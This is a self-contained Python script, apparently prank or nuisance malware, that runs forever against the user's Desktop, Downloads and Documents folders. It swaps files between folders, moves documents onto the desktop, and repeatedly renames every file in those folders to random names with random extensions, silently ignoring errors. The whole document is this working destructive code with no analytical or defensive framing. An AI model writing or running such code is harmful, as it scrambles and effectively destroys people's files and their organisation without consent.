import os
import random
import shutil
import time

desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
download_path = os.path.join(os.path.expanduser("~"), "Downloads")
documents_path = os.path.join(os.path.expanduser("~"), "Documents")


characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&()_+-=[]{};,.~`"
extensions = [
    ".txt",
    ".jpg",
    ".png",
    ".pdf",
    ".docx",
    ".xlsx",
    ".pptx", 
    ".mp3", 
    ".mp4", 
    ".avi", 
    ".mkv", 
    ".zip", 
    ".rar", 
    ".7z", 
    ".tar", 
    ".gz", 
    ".html", 
    ".css", 
    ".js", 
    ".json", 
    ".xml",
    ".csv",
    ".exe",
    ".bat",
    ".sh",
    ".iso",
    ".dll",
    ".apk",
    ".dmg",
    ".psd",
    ".ai",
    ".eps",
    ".indd",
    ".rtf",
    ".wav",
    ".flac",
    ".ogg",
    ".mov",
    ".wmv",
    ".flv",
    ".m4v",
    ".vob",
    ".ts",
    ".m2ts",
    ".webm",
    ".epub",
    ".mobi",
    ".azw",
    ".azw3",
    ".fb2",
    ".djvu",
    ".torrent",
]


def matching_files(folder):
    try:
        return [
            f for f in os.listdir(folder)
            if os.path.isfile(os.path.join(folder, f))
            and any(f.lower().endswith(ext) for ext in extensions)
        ]
    except (FileNotFoundError, PermissionError):
        return []


def unique_path(folder, name):
    candidate = os.path.join(folder, name)
    base, ext = os.path.splitext(name)
    n = 1
    while os.path.exists(candidate):
        candidate = os.path.join(folder, "%s_%d%s" % (base, n, ext))
        n += 1
    return candidate


def scramble(folder):
    files = [
        f for f in os.listdir(folder)
        if os.path.isfile(os.path.join(folder, f))
    ]
    for file in files:
        src = os.path.join(folder, file)
        if not os.path.exists(src):
            continue
        new_name = (
            random.choice(characters)
            + "".join(random.choices(characters, k=7))
            + random.choice(extensions)
        )
        dst = unique_path(folder, new_name)
        try:
            shutil.move(src, dst)
        except (OSError, shutil.Error):
            pass
        time.sleep(0.1)


while True:
    desktop_files = matching_files(desktop_path)
    download_files = matching_files(download_path)
    documents_files = matching_files(documents_path)

    if desktop_files and download_files:
        chosen_desktop_file = random.choice(desktop_files)
        chosen_download_file = random.choice(download_files)

        tmp = os.path.join(desktop_path, "__temp_" + "".join(random.choices(characters, k=12)))
        desktop_src = os.path.join(desktop_path, chosen_desktop_file)
        download_src = os.path.join(download_path, chosen_download_file)
        desktop_dst = unique_path(desktop_path, chosen_download_file)
        download_dst = unique_path(download_path, chosen_desktop_file)

        try:
            shutil.move(desktop_src, tmp)
            try:
                shutil.move(download_src, desktop_dst)
            finally:
                shutil.move(tmp, download_dst)
        except (OSError, shutil.Error):
            pass

    if documents_files:
        chosen_documents_file = random.choice(documents_files)
        doc_src = os.path.join(documents_path, chosen_documents_file)
        doc_dst = unique_path(desktop_path, chosen_documents_file)
        try:
            shutil.move(doc_src, doc_dst)
        except (OSError, shutil.Error):
            pass

    if not (desktop_files or download_files or documents_files):
        time.sleep(2)
        continue

    scramble(desktop_path)
    scramble(download_path)
    scramble(documents_path)